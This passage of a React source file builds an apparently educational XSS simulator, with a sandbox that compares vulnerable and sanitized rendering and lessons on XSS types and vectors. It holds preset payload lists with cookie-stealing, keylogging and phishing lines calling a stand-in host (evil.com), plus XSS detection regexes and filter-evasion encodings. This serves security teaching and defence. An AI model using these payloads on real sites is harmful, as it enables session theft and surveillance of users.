import React, { useState, useCallback } from 'react';
import {
  Shield,
  ShieldAlert,
  AlertTriangle,
  CheckCircle,
  Copy,
  Eye,
  EyeOff,
  Code,
  ArrowRight,
  Globe,
  Database,
  FileCode,
  Terminal,
  Lock,
  Unlock,
  BookOpen,
  Play,
  ChevronRight,
  Info,
  Zap,
  Bug,
  Server,
  Monitor,
  Users,
  RefreshCw,
} from 'lucide-react';

// ─── Types ───────────────────────────────────────────────────────────────────

type MainTab = 'learn' | 'sandbox';
type LearnSection = 'overview' | 'types' | 'vectors' | 'realworld' | 'impact' | 'prevention' | 'code';
type SandboxSubTab = 'reflected' | 'stored' | 'dom';
type SandboxMode = 'vulnerable' | 'sanitized';

interface StoredComment {
  id: number;
  author: string;
  text: string;
  timestamp: string;
  isXSS: boolean;
}

interface ConsoleEntry {
  id: number;
  type: 'info' | 'warning' | 'stolen' | 'blocked';
  message: string;
  timestamp: string;
}

// ─── Utility Functions ──────────────────────────────────────────────────────

function sanitizeHTML(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

function detectXSSPatterns(input: string): { hasXSS: boolean; patterns: string[] } {
  const patterns: string[] = [];
  const lower = input.toLowerCase();
  if (/<script[\s>]/i.test(input)) patterns.push('<script> tag injection');
  if (/on\w+\s*=/i.test(input)) patterns.push('Event handler attribute (onload, onerror, etc.)');
  if (/<img[^>]+onerror/i.test(input)) patterns.push('Image onerror handler');
  if (/<svg[^>]+onload/i.test(input)) patterns.push('SVG onload handler');
  if (/<iframe/i.test(input)) patterns.push('<iframe> injection');
  if (/javascript:/i.test(input)) patterns.push('javascript: protocol URI');
  if (lower.includes('document.cookie')) patterns.push('Cookie access attempt');
  if (/<input[^>]+onfocus/i.test(input)) patterns.push('Input autofocus/onfocus');
  if (/<body[^>]+onload/i.test(input)) patterns.push('Body onload handler');
  if (lower.includes('eval(')) patterns.push('eval() code execution');
  if (/<object/i.test(input)) patterns.push('<object> tag injection');
  if (/<embed/i.test(input)) patterns.push('<embed> tag injection');
  if (/expression\s*\(/i.test(input)) patterns.push('CSS expression() injection');
  if (/<a[^>]+href\s*=\s*["']?javascript:/i.test(input)) patterns.push('Anchor javascript: href');
  if (lower.includes('innerhtml')) patterns.push('innerHTML manipulation');
  if (lower.includes('document.write')) patterns.push('document.write() call');
  if (/<style[^>]*>.*expression/i.test(input)) patterns.push('Style expression injection');
  return { hasXSS: patterns.length > 0, patterns };
}

function simulateAttackConsequences(input: string): string[] {
  const consequences: string[] = [];
  const lower = input.toLowerCase();
  if (lower.includes('document.cookie') || lower.includes('cookie')) {
    consequences.push('[STOLEN] Session cookie: sessionId=abc123def456; authToken=eyJhbG...');
  }
  if (lower.includes('localstorage') || lower.includes('storage')) {
    consequences.push('[STOLEN] localStorage data: {user: "admin", apiKey: "sk-live-xxx"}');
  }
  if (lower.includes('keylog') || lower.includes('keypress') || lower.includes('keydown')) {
    consequences.push('[CAPTURE] Keylogger installed - recording all keystrokes on page');
  }
  if (lower.includes('fetch') || lower.includes('xmlhttp') || lower.includes('ajax')) {
    consequences.push('[EXFIL] Data exfiltration request sent to attacker server');
  }
  if (lower.includes('redirect') || lower.includes('location') || lower.includes('window.location')) {
    consequences.push('[REDIRECT] User would be redirected to phishing page');
  }
  if (/<img|<iframe|<embed|<object/i.test(input)) {
    consequences.push('[INJECT] External resource embedded in page');
  }
  if (lower.includes('alert') || lower.includes('prompt') || lower.includes('confirm')) {
    consequences.push('[EXECUTE] JavaScript dialog would pop up (proof of execution)');
  }
  if (consequences.length === 0 && detectXSSPatterns(input).hasXSS) {
    consequences.push('[EXECUTE] Arbitrary JavaScript code would run in victim browser');
  }
  return consequences;
}

// ─── Payload Presets ────────────────────────────────────────────────────────

const REFLECTED_PAYLOADS = [
  { label: 'Basic Alert', payload: '<script>alert("XSS")</script>', desc: 'Classic script injection' },
  { label: 'Image Error Handler', payload: '<img src=x onerror="alert(\'XSS\')">', desc: 'Fires when image fails to load' },
  { label: 'SVG Onload', payload: '<svg onload="alert(\'XSS\')">', desc: 'SVG elements auto-execute onload' },
  { label: 'Body Background', payload: '<body onload="alert(\'XSS\')">', desc: 'Triggers on body element load' },
  { label: 'Input Autofocus', payload: '<input autofocus onfocus="alert(\'XSS\')">', desc: 'Auto-triggers via focus event' },
  { label: 'Marquee Tag', payload: '<marquee onstart="alert(\'XSS\')">', desc: 'Legacy HTML element trick' },
];

const STORED_PAYLOADS = [
  { label: 'Cookie Theft', payload: '<script>new Image().src="http://evil.com/?c="+document.cookie</script>', desc: 'Exfiltrates cookies via image request' },
  { label: 'Keylogger', payload: '<script>document.onkeypress=function(e){new Image().src="http://evil.com/?k="+e.key}</script>', desc: 'Captures keystrokes' },
  { label: 'Iframe Phishing', payload: '<iframe src="http://evil.com/fake-login" style="width:100%;height:500px;border:none"></iframe>', desc: 'Overlays fake login form' },
  { label: 'Session Hijack', payload: '<script>fetch("http://evil.com/steal?s="+document.cookie)</script>', desc: 'Sends session to attacker via fetch' },
  { label: 'Defacement', payload: '<script>document.body.innerHTML="<h1>HACKED</h1>"</script>', desc: 'Replaces page content entirely' },
  { label: 'Crypto Miner', payload: '<script src="http://evil.com/miner.js"></script>', desc: 'Loads external malicious script' },
];

const DOM_PAYLOADS = [
  { label: 'innerHTML Inject', payload: '<div onmouseover="alert(\'XSS\')">Hover me!</div>', desc: 'Executes when user hovers element' },
  { label: 'Hash Fragment', payload: '#<img src=x onerror=alert("XSS")>', desc: 'Payload in URL hash fragment' },
  { label: 'DOM Clobbering', payload: '<form id="test"><input name="action" value="javascript:alert(1)"></form>', desc: 'Overrides DOM properties' },
  { label: 'Template Literal', payload: '${alert("XSS")}', desc: 'Exploits unsafe template strings' },
  { label: 'Event Handler', payload: '<details open ontoggle="alert(\'XSS\')">', desc: 'Uses HTML5 details element' },
  { label: 'Anchor Inject', payload: '<a href="javascript:alert(\'XSS\')">Click me</a>', desc: 'javascript: protocol in href' },
];

// ─── Data Constants ─────────────────────────────────────────────────────────

const LEARN_SECTIONS: { key: LearnSection; label: string }[] = [
  { key: 'overview', label: 'What is XSS?' },
  { key: 'types', label: 'XSS Types' },
  { key: 'vectors', label: 'Attack Vectors' },
  { key: 'realworld', label: 'Real-World Cases' },
  { key: 'impact', label: 'Impact' },
  { key: 'prevention', label: 'Prevention' },
  { key: 'code', label: 'Code Examples' },
];

// ─── Component ──────────────────────────────────────────────────────────────

let nextCommentId = 100;
let nextConsoleId = 100;

export const XSSSimulator: React.FC = () => {
  // Main state
  const [mainTab, setMainTab] = useState<MainTab>('sandbox');
  const [learnSection, setLearnSection] = useState<LearnSection>('overview');

  // Sandbox state
  const [sandboxTab, setSandboxTab] = useState<SandboxSubTab>('reflected');
  const [mode, setMode] = useState<SandboxMode>('vulnerable');
  const [input, setInput] = useState('');
  const [searchResult, setSearchResult] = useState('');
  const [domContent, setDomContent] = useState('');
  const [showRawHTML, setShowRawHTML] = useState(false);
  const [consoleEntries, setConsoleEntries] = useState<ConsoleEntry[]>([]);
  const [storedComments, setStoredComments] = useState<StoredComment[]>([
    { id: 1, author: 'Alice', text: 'Great article, very informative!', timestamp: '2 hours ago', isXSS: false },
    { id: 2, author: 'Bob', text: 'Thanks for sharing this.', timestamp: '1 hour ago', isXSS: false },
    { id: 3, author: 'Carol', text: 'I learned a lot from this post.', timestamp: '45 min ago', isXSS: false },
  ]);

  const isSafe = mode === 'sanitized';
  const detection = detectXSSPatterns(input);

  // ─── Handlers ───────────────────────────────────────────────────────────

  const addConsoleEntry = useCallback((type: ConsoleEntry['type'], message: string) => {
    const now = new Date();
    const ts = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
    setConsoleEntries(prev => [...prev, { id: nextConsoleId++, type, message, timestamp: ts }]);
  }, []);

  const handleReflectedSubmit = useCallback(() => {
    if (!input.trim()) return;
    const det = detectXSSPatterns(input);
    if (isSafe) {
      const clean = sanitizeHTML(input);
      setSearchResult(clean);
      addConsoleEntry('blocked', `Sanitized input: "${clean}"`);
      if (det.hasXSS) {
        addConsoleEntry('info', `XSS attempt blocked. ${det.patterns.length} pattern(s) neutralized.`);
      }
    } else {
      setSearchResult(input);
      if (det.hasXSS) {
        addConsoleEntry('warning', `XSS payload reflected in page output!`);
        simulateAttackConsequences(input).forEach(c => addConsoleEntry('stolen', c));
      }
    }
  }, [input, isSafe, addConsoleEntry]);

  const handleStoredSubmit = useCallback(() => {
    if (!input.trim()) return;
    const det = detectXSSPatterns(input);
    const comment: StoredComment = {
      id: nextCommentId++,
      author: 'Attacker',
      text: isSafe ? sanitizeHTML(input) : input,
      timestamp: 'Just now',
      isXSS: !isSafe && det.hasXSS,
    };
    setStoredComments(prev => [...prev, comment]);
    if (isSafe) {
      addConsoleEntry('blocked', 'Comment sanitized before storage.');
      if (det.hasXSS) addConsoleEntry('info', `XSS attempt neutralized in stored comment.`);
    } else if (det.hasXSS) {
      addConsoleEntry('warning', 'Malicious comment stored in database! All viewers affected.');
      simulateAttackConsequences(input).forEach(c => addConsoleEntry('stolen', c));
    }
    setInput('');
  }, [input, isSafe, addConsoleEntry]);

  const handleDOMSubmit = useCallback(() => {
    if (!input.trim()) return;
    const det = detectXSSPatterns(input);
    if (isSafe) {
      setDomContent(sanitizeHTML(input));
      addConsoleEntry('blocked', 'DOM update used textContent (safe).');
      if (det.hasXSS) addConsoleEntry('info', 'DOM-based XSS attempt prevented by safe API.');
    } else {
      setDomContent(input);
      if (det.hasXSS) {
        addConsoleEntry('warning', 'innerHTML used to write unsanitized input to DOM!');
        simulateAttackConsequences(input).forEach(c => addConsoleEntry('stolen', c));
      }
    }
  }, [input, isSafe, addConsoleEntry]);

  const handleSubmit = useCallback(() => {
    if (sandboxTab === 'reflected') handleReflectedSubmit();
    else if (sandboxTab === 'stored') handleStoredSubmit();
    else handleDOMSubmit();
  }, [sandboxTab, handleReflectedSubmit, handleStoredSubmit, handleDOMSubmit]);

  const handlePayloadClick = useCallback((payload: string) => {
    setInput(payload);
  }, []);

  const clearConsole = useCallback(() => {
    setConsoleEntries([]);
  }, []);

  const resetSandbox = useCallback(() => {
    setInput('');
    setSearchResult('');
    setDomContent('');
    setConsoleEntries([]);
    setStoredComments([
      { id: 1, author: 'Alice', text: 'Great article, very informative!', timestamp: '2 hours ago', isXSS: false },
      { id: 2, author: 'Bob', text: 'Thanks for sharing this.', timestamp: '1 hour ago', isXSS: false },
      { id: 3, author: 'Carol', text: 'I learned a lot from this post.', timestamp: '45 min ago', isXSS: false },
    ]);
  }, []);

  const copyToClipboard = useCallback((text: string) => {
    navigator.clipboard.writeText(text).catch(() => {});
  }, []);

  // ─── DOM Tree Builder ───────────────────────────────────────────────────

  const renderDOMTree = useCallback((content: string, safe: boolean) => {
    const det = detectXSSPatterns(content);
    const isInjected = det.hasXSS && !safe;
    const displayContent = safe ? sanitizeHTML(content) : content;

    const nodes = [
      { depth: 0, tag: 'html', close: false },
      { depth: 1, tag: 'head', close: false },
      { depth: 2, tag: 'meta charset="utf-8"', close: true },
      { depth: 1, tag: '/head', close: true },
      { depth: 1, tag: 'body', close: false },
      { depth: 2, tag: 'div class="app"', close: false },
      { depth: 3, tag: 'div class="content"', close: false },
      { depth: 4, tag: 'div class="user-input"', close: false, content: displayContent, injected: isInjected },
      { depth: 4, tag: '/div', close: true },
      { depth: 3, tag: '/div', close: true },
      { depth: 2, tag: '/div', close: true },
      { depth: 1, tag: '/body', close: true },
      { depth: 0, tag: '/html', close: true },
    ];

    return (
      <div className="font-mono text-[11px] leading-relaxed">
        {nodes.map((node, i) => (
          <div key={i} style={{ paddingLeft: node.depth * 18 }} className="flex items-start gap-1">
            <span className={node.injected ? 'text-red-400 font-bold' : 'text-blue-400 dark:text-blue-500'}>
              &lt;{node.tag}&gt;
            </span>
            {node.content && (
              <span className={`${node.injected ? 'text-red-300 bg-red-500/10 px-1 rounded' : 'text-gray-500 dark:text-gray-400'} break-all`}>
                {node.content.length > 80 ? node.content.slice(0, 80) + '...' : node.content}
              </span>
            )}
            {node.injected && (
              <span className="ml-1 text-[9px] font-bold text-red-500 bg-red-500/20 px-1.5 py-0.5 rounded-full shrink-0">
                INJECTED
              </span>
            )}
          </div>
        ))}
      </div>
    );
  }, []);

  // ─── Learn Tab Render ───────────────────────────────────────────────────

  const renderLearnContent = () => {
    switch (learnSection) {
      case 'overview':
        return (
          <div className="space-y-4">
            <div className="bg-gradient-to-r from-red-50 to-orange-50 dark:from-red-950/20 dark:to-orange-950/20 rounded-xl border border-red-200 dark:border-red-800/50 p-5">
              <h3 className="text-base font-bold text-gray-900 dark:text-gray-100 mb-3">What is Cross-Site Scripting (XSS)?</h3>
              <p className="text-sm text-gray-700 dark:text-gray-300 leading-relaxed mb-3">
                Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious
                client-side scripts into web pages viewed by other users. It occurs when a web application includes
                unvalidated or unescaped user input as part of its HTML output. The victim's browser has no way
                to know that the script is not trustworthy and will execute it with the same privileges as legitimate
                scripts from the site.
              </p>
              <p className="text-sm text-gray-700 dark:text-gray-300 leading-relaxed mb-3">
                XSS consistently ranks in the OWASP Top 10 security risks. It is one of the most prevalent
                vulnerabilities found in web applications, affecting everything from small personal blogs
                to major enterprise platforms and social media sites.
              </p>
              <p className="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
                Unlike attacks that target the server directly, XSS targets the users of a vulnerable application.
                The attacker does not directly attack the victim. Instead, the attacker exploits a vulnerability
                in a website that the victim visits, and the website acts as a vehicle to deliver the malicious
                script to the victim's browser.
              </p>
            </div>

            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h4 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-3">How XSS Works - The Attack Flow</h4>
              <div className="flex flex-col gap-2">
                {[
                  { step: '1', icon: <Bug className="w-4 h-4" />, title: 'Discovery', desc: 'Attacker finds an input field or URL parameter that reflects user input without sanitization.' },
                  { step: '2', icon: <Code className="w-4 h-4" />, title: 'Craft Payload', desc: 'Attacker creates a malicious script payload designed to execute in the victim\'s browser context.' },
                  { step: '3', icon: <Globe className="w-4 h-4" />, title: 'Delivery', desc: 'The payload is delivered via a crafted URL, stored in a database, or injected through DOM manipulation.' },
                  { step: '4', icon: <Monitor className="w-4 h-4" />, title: 'Execution', desc: 'When the victim\'s browser renders the page, the injected script executes with the page\'s full privileges.' },
                  { step: '5', icon: <Zap className="w-4 h-4" />, title: 'Exploitation', desc: 'The script can steal cookies, capture keystrokes, redirect users, modify page content, or perform actions as the victim.' },
                ].map((s, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-gray-50 dark:bg-gray-800">
                    <div className="w-7 h-7 rounded-full bg-red-100 dark:bg-red-900/40 flex items-center justify-center text-red-600 dark:text-red-400 shrink-0">
                      {s.icon}
                    </div>
                    <div>
                      <span className="text-xs font-bold text-gray-900 dark:text-gray-100">Step {s.step}: {s.title}</span>
                      <p className="text-xs text-gray-600 dark:text-gray-400 mt-0.5">{s.desc}</p>
                    </div>
                    {i < 4 && <ChevronRight className="w-4 h-4 text-gray-400 self-center ml-auto shrink-0 hidden sm:block" />}
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-amber-50 dark:bg-amber-950/20 rounded-xl border border-amber-200 dark:border-amber-800/50 p-4">
              <div className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-amber-600 dark:text-amber-400 mt-0.5 shrink-0" />
                <div>
                  <h4 className="text-xs font-bold text-amber-800 dark:text-amber-300 mb-1">Why XSS is Dangerous</h4>
                  <p className="text-xs text-amber-700 dark:text-amber-400 leading-relaxed">
                    XSS attacks exploit the trust a user has in a particular website. The browser executes the
                    malicious script because it came from a trusted source. The script can access cookies, session tokens,
                    and other sensitive information retained by the browser. It can also rewrite the content of the HTML page,
                    making phishing attacks nearly undetectable.
                  </p>
                </div>
              </div>
            </div>
          </div>
        );

      case 'types':
        return (
          <div className="space-y-4">
            {/* Reflected XSS */}
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <div className="flex items-center gap-2 mb-3">
                <div className="w-3 h-3 rounded-full bg-orange-500"></div>
                <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100">Type 1: Reflected XSS (Non-Persistent)</h3>
              </div>
              <p className="text-xs text-gray-600 dark:text-gray-400 leading-relaxed mb-4">
                Reflected XSS occurs when user input is immediately returned by a web application in an error message,
                search result, or any response that includes the input as part of the request. The malicious payload
                is part of the URL or HTTP request and is "reflected" back in the response. The attack requires the
                victim to click a specially crafted link.
              </p>
              <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 mb-3">
                <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300 mb-3">Attack Flow Diagram</h4>
                <div className="flex flex-col sm:flex-row items-center gap-2 text-[11px]">
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Users className="w-3.5 h-3.5 mx-auto mb-1" />
                    Attacker crafts URL with payload
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 text-center font-medium">
                    <Monitor className="w-3.5 h-3.5 mx-auto mb-1" />
                    Victim clicks the link
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-purple-100 dark:bg-purple-900/40 text-purple-700 dark:text-purple-300 text-center font-medium">
                    <Server className="w-3.5 h-3.5 mx-auto mb-1" />
                    Server reflects input in response
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Zap className="w-3.5 h-3.5 mx-auto mb-1" />
                    Script executes in victim's browser
                  </div>
                </div>
              </div>
              <div className="bg-gray-900 rounded-lg p-3">
                <p className="text-[10px] text-gray-500 mb-1 font-mono">Example malicious URL:</p>
                <code className="text-[11px] text-red-400 break-all">
                  https://example.com/search?q=&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;
                </code>
              </div>
            </div>

            {/* Stored XSS */}
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <div className="flex items-center gap-2 mb-3">
                <div className="w-3 h-3 rounded-full bg-red-600"></div>
                <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100">Type 2: Stored XSS (Persistent)</h3>
              </div>
              <p className="text-xs text-gray-600 dark:text-gray-400 leading-relaxed mb-4">
                Stored XSS is the most dangerous type. The malicious script is permanently stored on the target server,
                such as in a database, comment field, forum post, or visitor log. When victims visit the affected page,
                the stored script is served as part of the web page and executes automatically. Every single user who
                views the page is affected, making this a one-to-many attack.
              </p>
              <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 mb-3">
                <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300 mb-3">Attack Flow Diagram</h4>
                <div className="flex flex-col sm:flex-row items-center gap-2 text-[11px]">
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Users className="w-3.5 h-3.5 mx-auto mb-1" />
                    Attacker submits payload via form
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-purple-100 dark:bg-purple-900/40 text-purple-700 dark:text-purple-300 text-center font-medium">
                    <Database className="w-3.5 h-3.5 mx-auto mb-1" />
                    Payload stored in database
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 text-center font-medium">
                    <Monitor className="w-3.5 h-3.5 mx-auto mb-1" />
                    Any user visits the page
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Zap className="w-3.5 h-3.5 mx-auto mb-1" />
                    Script auto-executes for every viewer
                  </div>
                </div>
              </div>
              <div className="bg-gray-900 rounded-lg p-3">
                <p className="text-[10px] text-gray-500 mb-1 font-mono">Example stored in a comment field:</p>
                <code className="text-[11px] text-red-400 break-all">
                  Great post! &lt;script&gt;new Image().src="http://evil.com/?cookie="+document.cookie&lt;/script&gt;
                </code>
              </div>
            </div>

            {/* DOM-based XSS */}
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <div className="flex items-center gap-2 mb-3">
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100">Type 3: DOM-based XSS (Client-Side)</h3>
              </div>
              <p className="text-xs text-gray-600 dark:text-gray-400 leading-relaxed mb-4">
                DOM-based XSS is unique because the vulnerability exists entirely in client-side code. The payload never
                reaches the server. Instead, client-side JavaScript reads user-controlled data (like URL fragments,
                document.referrer, or window.name) and writes it to the DOM using unsafe methods like innerHTML or
                document.write(). The server's response does not contain the payload -- the attack happens entirely
                in the browser.
              </p>
              <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 mb-3">
                <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300 mb-3">Attack Flow Diagram</h4>
                <div className="flex flex-col sm:flex-row items-center gap-2 text-[11px]">
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Users className="w-3.5 h-3.5 mx-auto mb-1" />
                    Attacker crafts URL with # payload
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 text-center font-medium">
                    <Monitor className="w-3.5 h-3.5 mx-auto mb-1" />
                    Victim opens link in browser
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-yellow-100 dark:bg-yellow-900/40 text-yellow-700 dark:text-yellow-300 text-center font-medium">
                    <FileCode className="w-3.5 h-3.5 mx-auto mb-1" />
                    Client JS reads hash and writes to DOM
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400 shrink-0 rotate-90 sm:rotate-0" />
                  <div className="px-3 py-2 rounded-lg bg-red-100 dark:bg-red-900/40 text-red-700 dark:text-red-300 text-center font-medium">
                    <Zap className="w-3.5 h-3.5 mx-auto mb-1" />
                    Script executes (server never saw it)
                  </div>
                </div>
              </div>
              <div className="bg-gray-900 rounded-lg p-3">
                <p className="text-[10px] text-gray-500 mb-1 font-mono">Vulnerable client-side code:</p>
                <code className="text-[11px] text-yellow-400 break-all">
                  document.getElementById('output').innerHTML = location.hash.slice(1);
                </code>
              </div>
            </div>

            <div className="bg-blue-50 dark:bg-blue-950/20 rounded-xl border border-blue-200 dark:border-blue-800/50 p-4">
              <h4 className="text-xs font-bold text-blue-700 dark:text-blue-300 mb-2">Comparison Summary</h4>
              <div className="overflow-x-auto">
                <table className="w-full text-[11px]">
                  <thead>
                    <tr className="border-b border-blue-200 dark:border-blue-800">
                      <th className="text-left py-1.5 text-blue-800 dark:text-blue-300 font-semibold pr-3">Aspect</th>
                      <th className="text-left py-1.5 text-blue-800 dark:text-blue-300 font-semibold pr-3">Reflected</th>
                      <th className="text-left py-1.5 text-blue-800 dark:text-blue-300 font-semibold pr-3">Stored</th>
                      <th className="text-left py-1.5 text-blue-800 dark:text-blue-300 font-semibold">DOM-based</th>
                    </tr>
                  </thead>
                  <tbody className="text-blue-700 dark:text-blue-400">
                    <tr className="border-b border-blue-100 dark:border-blue-900/50">
                      <td className="py-1.5 font-medium pr-3">Persistence</td>
                      <td className="py-1.5 pr-3">Non-persistent</td>
                      <td className="py-1.5 pr-3">Persistent (stored in DB)</td>
                      <td className="py-1.5">Non-persistent</td>
                    </tr>
                    <tr className="border-b border-blue-100 dark:border-blue-900/50">
                      <td className="py-1.5 font-medium pr-3">Server involved?</td>
                      <td className="py-1.5 pr-3">Yes</td>
                      <td className="py-1.5 pr-3">Yes</td>
                      <td className="py-1.5">No (client only)</td>
                    </tr>
                    <tr className="border-b border-blue-100 dark:border-blue-900/50">
                      <td className="py-1.5 font-medium pr-3">Victim count</td>
                      <td className="py-1.5 pr-3">One (per click)</td>
                      <td className="py-1.5 pr-3">Many (all viewers)</td>
                      <td className="py-1.5">One (per click)</td>
                    </tr>
                    <tr className="border-b border-blue-100 dark:border-blue-900/50">
                      <td className="py-1.5 font-medium pr-3">Delivery</td>
                      <td className="py-1.5 pr-3">Crafted URL/link</td>
                      <td className="py-1.5 pr-3">Form submission</td>
                      <td className="py-1.5">URL fragment/hash</td>
                    </tr>
                    <tr>
                      <td className="py-1.5 font-medium pr-3">Severity</td>
                      <td className="py-1.5 pr-3">Medium-High</td>
                      <td className="py-1.5 pr-3">Critical</td>
                      <td className="py-1.5">Medium-High</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        );

      case 'vectors':
        return (
          <div className="space-y-4">
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-3">Common Attack Vectors</h3>
              <p className="text-xs text-gray-600 dark:text-gray-400 mb-4 leading-relaxed">
                XSS payloads can be injected through various entry points. Understanding these vectors is critical
                for both offensive security testing and defensive implementation. Here are the most common injection
                points and payload patterns.
              </p>
              <div className="space-y-3">
                {[
                  { cat: 'HTML Element Injection', items: [
                    { code: '<script>alert("XSS")</script>', desc: 'Direct script tag insertion -- the classic payload.' },
                    { code: '<img src=x onerror="alert(\'XSS\')">', desc: 'Uses broken image to trigger error handler.' },
                    { code: '<svg/onload=alert("XSS")>', desc: 'SVG elements automatically fire onload events.' },
                    { code: '<body onload=alert("XSS")>', desc: 'Overrides the body element onload.' },
                  ]},
                  { cat: 'Event Handler Injection', items: [
                    { code: '<div onmouseover="alert(\'XSS\')">hover</div>', desc: 'Mouse interaction triggers execution.' },
                    { code: '<input onfocus="alert(\'XSS\')" autofocus>', desc: 'Autofocus forces immediate execution.' },
                    { code: '<details open ontoggle="alert(\'XSS\')">', desc: 'HTML5 details element toggle event.' },
                    { code: '<marquee onstart="alert(\'XSS\')">', desc: 'Legacy element with auto-firing event.' },
                  ]},
                  { cat: 'URI / Protocol Injection', items: [
                    { code: '<a href="javascript:alert(\'XSS\')">click</a>', desc: 'javascript: protocol in anchor href.' },
                    { code: '<iframe src="javascript:alert(\'XSS\')"></iframe>', desc: 'iframe with javascript: source URI.' },
                    { code: '<form action="javascript:alert(\'XSS\')">', desc: 'Form action with javascript: protocol.' },
                  ]},
                  { cat: 'Data Exfiltration Payloads', items: [
                    { code: '<script>new Image().src="http://evil.com/?c="+document.cookie</script>', desc: 'Steal cookies via image request (no CORS needed).' },
                    { code: '<script>fetch("http://evil.com",{method:"POST",body:document.cookie})</script>', desc: 'Exfiltrate data via fetch POST.' },
                    { code: '<script>document.onkeypress=e=>fetch("http://evil.com/?k="+e.key)</script>', desc: 'Keylogger sending each keystroke to attacker.' },
                  ]},
                ].map((category, ci) => (
                  <div key={ci}>
                    <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300 mb-2">{category.cat}</h4>
                    <div className="space-y-1.5">
                      {category.items.map((item, ii) => (
                        <div key={ii} className="bg-gray-50 dark:bg-gray-800 rounded-lg p-2.5">
                          <code className="text-[11px] text-red-500 dark:text-red-400 font-mono break-all block mb-1">{item.code}</code>
                          <p className="text-[10px] text-gray-500 dark:text-gray-500">{item.desc}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-amber-50 dark:bg-amber-950/20 rounded-xl border border-amber-200 dark:border-amber-800/50 p-4">
              <div className="flex items-start gap-2">
                <Info className="w-4 h-4 text-amber-600 dark:text-amber-400 mt-0.5 shrink-0" />
                <div>
                  <h4 className="text-xs font-bold text-amber-800 dark:text-amber-300 mb-1">Filter Evasion Techniques</h4>
                  <p className="text-xs text-amber-700 dark:text-amber-400 leading-relaxed mb-2">
                    Attackers often use encoding tricks to bypass naive input filters:
                  </p>
                  <ul className="space-y-1 text-[11px] text-amber-700 dark:text-amber-400">
                    <li>Case variation: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">&lt;ScRiPt&gt;</code></li>
                    <li>HTML encoding: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">&amp;#60;script&amp;#62;</code></li>
                    <li>URL encoding: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">%3Cscript%3E</code></li>
                    <li>Unicode: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">\u003cscript\u003e</code></li>
                    <li>Null bytes: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">&lt;scr%00ipt&gt;</code></li>
